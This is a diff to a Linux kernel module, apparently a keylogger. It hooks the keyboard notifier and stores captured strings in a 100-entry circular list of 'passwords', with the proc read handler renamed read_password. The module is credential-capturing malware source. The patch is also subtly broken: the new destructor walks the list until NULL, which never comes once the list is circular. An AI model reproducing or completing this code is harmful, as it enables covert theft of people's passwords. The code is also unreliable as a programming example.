@@ -14,15 +14,6 @@
  * 	   a letter.
  *
  * */
-#include <linux/module.h>
-#include <linux/kernel.h>
-#include <linux/interrupt.h>
-#include <linux/proc_fs.h>
-#include <linux/sched.h>
-#include <linux/keyboard.h>
-#include <asm/uaccess.h>
-#include <asm/io.h>
-#include <linux/slab.h>
 
 #include "helper.h"
 
@@ -30,6 +21,7 @@
 
 struct notifier_block nb;
 int password_count;
+bool overwrite = false;
 struct password* HEAD = NULL;
 
 // We want a reference to the password* head
@@ -39,31 +31,72 @@ void push(struct password** head, char* password_value){
 	struct password* curr;
 	struct password* new_node;
 	
-	// Use kfree on this bad boy
-	new_node = (struct password*)kmalloc(sizeof(struct password), GFP_KERNEL);
-	new_node->pw = password_value;
-        new_node->next = NULL;
-        password_count++;
+	password_count++; // TODO keep an eye on the location of this.
+	
+	if(!overwrite){
+		// Use kfree on this bad boy
+		new_node = (struct password*)kmalloc(sizeof(struct password), GFP_KERNEL);
+		new_node->pw = password_value;
+		new_node->overwrite_num = 1;
+	        new_node->next = NULL;
+        
+		if(*head == NULL){
+        	        *head = new_node;
+        	        return;
+        	}
 
-        if(*head == NULL){
-                *head = new_node;
-                return;
-        }
+        	curr = *head;
+        	while(curr->next != NULL){
+        	        curr = curr->next;
+        	}
+        	curr->next = new_node;
 
-        curr = *head;
-        while(curr->next != NULL){
-                curr = curr->next;
-        }
-        curr->next = new_node;
+		if(password_count == 100){
+			new_node->next = *head;
+			overwrite = true;
+		}
+	
+	}else{
+		// Iterate until we find the next node for overwriting
+		curr = *head;
+		if(password_count % 100 == 1){ // Should be at head again.
+			curr->pw = password_value;
+			curr->overwrite_num++;
+			return;
+		}
+		while(curr->overwrite_num == curr->next->overwrite_num){
+			curr = curr->next;
+		} // Brings curr to the last written node before this push call
+
+		curr->next->pw = password_value;
+		curr->next->overwrite_num++;
+	}
+
 }
 
-ssize_t read_simple(struct file *filp,char *buf,size_t count,loff_t *offp ) 
-{
+void ll_destructor(struct password** head){
+	struct password* next;
+	struct password* curr;
+	
+	if(*head == NULL){
+		return;
+	}
+
+	curr = *head;
+	while(curr != NULL){
+		next = curr->next;
+		kfree(curr);
+		curr = next;
+	}
+}
+
+
+ssize_t read_password(struct file *filp,char *buf,size_t count,loff_t *offp ) {
 	return 0;
 }
 
 struct file_operations proc_fops = {
-	read: read_simple,
+	read: read_password,
 };
 
 int kb_notifier_fn(struct notifier_block *pnb, unsigned long action, void* data){
@@ -89,6 +122,7 @@ int init (void) {
 
 void cleanup(void) {
 	unregister_keyboard_notifier(&nb);
+	ll_destructor(&HEAD);
 	// remove_proc_entry(PROC_FILE_NAME,NULL);
 }
 
